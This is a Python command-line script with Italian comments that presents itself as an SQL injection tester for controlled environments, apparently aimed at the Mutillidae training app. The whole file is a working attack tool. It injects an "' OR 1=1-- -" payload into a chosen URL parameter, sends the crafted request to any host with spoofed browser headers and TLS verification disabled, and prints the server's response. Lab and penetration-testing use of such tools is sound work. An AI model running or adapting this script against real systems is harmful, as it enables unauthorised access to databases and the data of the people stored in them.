"""
SQL Injection Tester - Script per test di sicurezza in ambienti controllati
Versione ottimizzata per l'esempio specifico fornito
"""

import socket
import argparse
import urllib.parse
import ssl
import sys

def build_injection_request(host, url_path, parameter, sql_injection, cookie, user_agent=None):
    """
    Costruisce una richiesta HTTP GET con SQL injection nel parametro specificato.
    Ottimizzata per l'URL di esempio di Mutillidae.
    
    Args:
        host (str): IP o hostname del server target
        url_path (str): Percorso URL completo con parametri (es. /path?param1=val1&param2=val2)
        parameter (str): Parametro query string da injectare
        sql_injection (str): Payload SQL da iniettare
        cookie (str): Cookie di sessione
        user_agent (str, optional): User-Agent personalizzato
    
    Returns:
        str: Richiesta HTTP completa pronta per l'invio
    """
    
    # DEBUG: Visualizza i parametri ricevuti
    print(f"[DEBUG] Host: {host}")
    print(f"[DEBUG] URL path: {url_path}")
    print(f"[DEBUG] Parameter to inject: {parameter}")
    print(f"[DEBUG] Cookie: {cookie}")
    print(f"[DEBUG] SQL Injection: {sql_injection}")
    
    # Codifica il payload SQL per l'URL
    # urllib.parse.quote_plus converte spazi in '+' e caratteri speciali in %XX
    injection_encoded = urllib.parse.quote_plus(sql_injection)
    print(f"[DEBUG] Encoded injection: {injection_encoded}")
    
    # Analizza l'URL per separare percorso e parametri
    parsed_url = urllib.parse.urlparse(url_path)
    print(f"[DEBUG] Parsed URL - Path: {parsed_url.path}, Query: {parsed_url.query}")
    
    # Estrae i parametri della query string in un dizionario
    # parse_qs restituisce un dizionario dove ogni valore è una lista
    query_params = urllib.parse.parse_qs(parsed_url.query)
    print(f"[DEBUG] Original query params: {query_params}")
    
    # Verifica che il parametro da injectare esista
    if parameter not in query_params:
        print(f"[!] ERRORE: Il parametro '{parameter}' non è stato trovato nell'URL")
        print(f"[!] Parametri disponibili: {list(query_params.keys())}")
        return None
    
    # Sostituisce il valore del parametro con il payload SQL codificato
    # Nota: parse_qs restituisce liste come valori, quindi usiamo [injection_encoded]
    old_value = query_params[parameter]
    query_params[parameter] = [injection_encoded]
    print(f"[DEBUG] Parametro {parameter} cambiato da {old_value} a {query_params[parameter]}")
    
    # Ricostruisce la query string con il nuovo valore
    new_query = urllib.parse.urlencode(query_params, doseq=True)
    print(f"[DEBUG] New query string: {new_query}")
    
    # Ricostruisce l'URL completo con la nuova query
    new_url_path = urllib.parse.urlunparse((
        parsed_url.scheme,    # di solito vuoto per percorsi relativi
        parsed_url.netloc,    # di solito vuoto per percorsi relativi  
        parsed_url.path,      # il percorso principale (/mutillidae/index.php)
        parsed_url.params,    # parametri aggiuntivi (raro)
        new_query,            # nuova query string con injection
        parsed_url.fragment   # anchor (dopo #)
    ))
    print(f"[DEBUG] New URL path: {new_url_path}")
    
    # Headers HTTP essenziali per bypassare controlli base
    headers = {
        "Host": host,
        "User-Agent": user_agent or "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",  # Usa 'close' invece di 'keep-alive' per semplicità
        "Cookie": cookie,
        "Cache-Control": "no-cache"
    }
    
    # Costruzione della richiesta HTTP completa
    # Formato: GET /path?params HTTP/1.1\r\nHeaders\r\n\r\n
    request_lines = []
    request_lines.append(f"GET {new_url_path} HTTP/1.1")
    
    # Aggiungi tutti gli headers
    for key, value in headers.items():
        if value:  # Aggiungi solo headers con valori non vuoti
            request_lines.append(f"{key}: {value}")
    
    # Aggiungi riga vuota finale che separa headers dal body
    request_lines.append("")
    request_lines.append("")
    
    # Unisci tutto con ritorni a capo
    http_request = "\r\n".join(request_lines)
    
    return http_request

def main():
    """
    Funzione principale - Gestisce gli argomenti CLI ed esegue l'injection
    """
    
    # Configurazione parser argomenti da riga di comando
    parser = argparse.ArgumentParser(
        description='SQL Injection Tester per Mutillidae e applicazioni web simili',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Esempi d'uso:
  %(prog)s --host="192.168.1.100" -u="/path?param=value" --param="param" --cookie="session=123"
  %(prog)s --host="vulnerable.com" -u="/index.php?id=1" --param="id" --payload="' OR 1=1-- -"
        """
    )
    
    # Argomenti obbligatori per il funzionamento
    parser.add_argument('--host', required=True, 
                       help='Indirizzo IP o hostname del server target (es. 192.168.83.129)')
    
    parser.add_argument('-u', '--url', required=True,
                       help='Percorso URL completo con parametri (es. /mutillidae/index.php?page=test)')
    
    parser.add_argument('--param', required=True,
                       help='Nome del parametro query string da injectare (es. username, password, id)')
    
    # Argomenti opzionali
    parser.add_argument('--cookie', default='',
                       help='Cookie di sessione per autenticazione (es. PHPSESSID=abc123)')
    
    parser.add_argument('--ssl', action='store_true',
                       help='Usa HTTPS invece di HTTP')
    
    parser.add_argument('--port', type=int, default=None,
                       help='Porta personalizzata (default: 80 per HTTP, 443 per HTTPS)')
    
    parser.add_argument('--payload', default="' OR 1=1-- -",
                       help='Payload SQL personalizzato (default: \\\' OR 1=1-- -)')
    
    parser.add_argument('--user-agent', default=None,
                       help='User-Agent personalizzato')
    
    # Parsing degli argomenti
    args = parser.parse_args()
    
    # Imposta porta default in base al protocollo
    if args.port is None:
        args.port = 443 if args.ssl else 80
    
    print("[*] Configurazione SQL Injection Tester")
    print(f"[*] Target: {args.host}:{args.port}")
    print(f"[*] Protocollo: {'HTTPS' if args.ssl else 'HTTP'}")
    
    try:
        # Costruisce la richiesta HTTP con l'injection
        http_request = build_injection_request(
            host=args.host,
            url_path=args.url,
            parameter=args.param,
            sql_injection=args.payload,
            cookie=args.cookie,
            user_agent=args.user_agent
        )
        
        if not http_request:
            print("[!] Impossibile costruire la richiesta. Controlla i parametri.")
            return 1
        
        print("\n[*] Richiesta HTTP costruita:")
        print("=" * 60)
        print(http_request)
        print("=" * 60)
        
        # Connessione e invio della richiesta
        print(f"\n[*] Connessione a {args.host}:{args.port}...")
        
        if args.ssl:
            # Connessione SSL/HTTPS
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((args.host, args.port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=args.host) as secure_sock:
                    print("[*] Invio richiesta via HTTPS...")
                    secure_sock.sendall(http_request.encode())
                    
                    # Ricevi la risposta
                    response = b""
                    while True:
                        data = secure_sock.recv(4096)
                        if not data:
                            break
                        response += data
        else:
            # Connessione HTTP normale
            with socket.create_connection((args.host, args.port), timeout=10) as sock:
                print("[*] Invio richiesta via HTTP...")
                sock.sendall(http_request.encode())
                
                # Ricevi la risposta
                response = b""
                while True:
                    data = sock.recv(4096)
                    if not data:
                        break
                    response += data
        
        # Elabora e visualizza la risposta
        print("\n[*] Risposta dal server:")
        print("=" * 60)
        
        try:
            # Prova a decodificare come testo
            response_text = response.decode('utf-8', errors='replace')
            print(response_text)
        except UnicodeDecodeError:
            # Se non è testo, mostra informazioni raw
            print(f"[!] Risposta binaria - Dimensione: {len(response)} bytes")
            print(response[:500])  # Mostra primi 500 bytes
        
        print("=" * 60)
        print(f"[*] Dimensione risposta: {len(response)} bytes")
        
        return 0
        
    except socket.timeout:
        print("[!] Timeout: Connessione scaduta")
        return 1
    except ConnectionRefusedError:
        print("[!] Connessione rifiutata: Verifica host e porta")
        return 1
    except socket.gaierror as e:
        print(f"[!] Errore DNS: Impossibile risolvere {args.host}")
        return 1
    except ssl.SSLError as e:
        print(f"[!] Errore SSL: {e}")
        return 1
    except KeyboardInterrupt:
        print("\n[!] Interrotto dall'utente")
        return 1
    except Exception as e:
        print(f"[!] Errore imprevisto: {e}")
        return 1

# Punto di ingresso dello script
if __name__ == "__main__":
    sys.exit(main())